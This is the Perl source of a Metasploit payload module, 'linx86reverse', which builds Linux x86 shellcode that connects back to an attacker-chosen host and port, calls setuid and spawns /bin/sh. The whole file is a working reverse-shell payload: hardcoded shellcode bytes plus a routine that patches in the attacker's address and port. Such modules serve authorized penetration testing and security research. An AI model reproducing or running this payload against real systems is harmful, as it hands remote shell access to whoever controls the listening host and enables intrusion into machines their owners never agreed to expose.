
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::linx86_reverse;
use strict;
use base 'Msf::PayloadComponent::ReverseConnection';

my $info =
{
  'Name'         => 'linx86reverse',
  'Version'      => '$Revision$',
  'Description'  => 'Connect back to attacker and spawn a shell',
  'Authors'      => [ 'H D Moore <hdm [at] metasploit.com> [Artistic License]', ],
  'Arch'         => [ 'x86' ],
  'Priv'         => 0,
  'OS'           => [ 'linux' ],
  'Size'         => '',
};

sub new {
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHash($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);

  $self->_Info->{'Size'} = $self->_GenSize;
  return($self);
}

sub Build {
  my $self = shift;
  return($self->Generate($self->GetVar('LHOST'), $self->GetVar('LPORT')));
}

sub Generate {
  my $self = shift;
  my $host = shift;
  my $port = shift;
  my $off_port = 26;
  my $port_bin = pack('n', $port);
  my $off_host = 19;
  my $host_bin = gethostbyname($host);

  my $shellcode = # reverse connect setuid by hdm [at] metasploit.com
  "\x89\xe5\x31\xc0\x31\xdb\x43\x50\x6a\x01\x6a\x02\x89\xe1\xb0\x66".
  "\xcd\x80\x68\xc0\xa8\x00\xf7\x68\x02\x00\x22\x11\x89\xe1\x6a\x10".
  "\x51\x50\x89\xe1\x50\x31\xc0\xb0\x66\xb3\x03\xcd\x80\x85\xc0\x78".
  "\x33\x4b\x89\xd9\x31\xc0\x5b\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0".
  "\x31\xdb\x31\xc9\x31\xd2\xb0\xa4\xcd\x80\x31\xc0\x50\x89\xe2\x68".
  "\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x8d\x0c\x24".
  "\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";

  substr($shellcode, $off_port, 2, $port_bin);
  substr($shellcode, $off_host, 4, $host_bin);
  return($shellcode);
}

sub _GenSize {
  my $self = shift;
  my $bin = $self->Generate('127.0.0.1', '4444');
  return(length($bin));
}

1;
